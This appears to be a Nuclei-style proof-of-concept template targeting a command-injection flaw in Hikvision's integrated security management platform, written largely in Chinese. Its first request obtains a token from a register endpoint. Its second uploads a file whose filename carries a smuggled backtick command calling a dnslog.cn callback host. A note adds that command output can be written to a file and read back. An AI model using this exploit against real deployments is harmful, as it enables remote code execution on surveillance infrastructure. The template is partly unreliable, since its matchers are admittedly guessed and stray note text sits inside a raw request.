id: poc-nexfbi7w5agdrroy
info:
  name: 海康威视综合安防管理平台register命令执行漏洞
  author: hacktwo
  severity: critical
  description: '[!] 推断说明: 状态码缺失, 推断为 200。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
  tags: rce,2024
http:
- raw:
  - 'GET /iac/iasService/v1/register HTTP/1.1

    Host: {{Hostname}}


    2.命令注入'
  redirects: false
  matchers:
  - status:
    - 200
    type: status
- raw:
  - 'POST /svm/api/v1/productFile?type=product&ip=127.0.0.1&agentNo=1 HTTP/1.1

    Host: {{Hostname}}

    Token: 获取的token

    Content-Type: multipart/form-data;boundary =---------------------------123


    -----------------------------123

    Content-Disposition: form-data; name="file"; filename="`ping xxx.dnslog.cn`.zip"

    Content-Type: application/zip


    123

    -----------------------------123--


    也可以写入文件 ，访问获取执行结果'
  redirects: false
  matchers:
  - status:
    - 200
    type: status
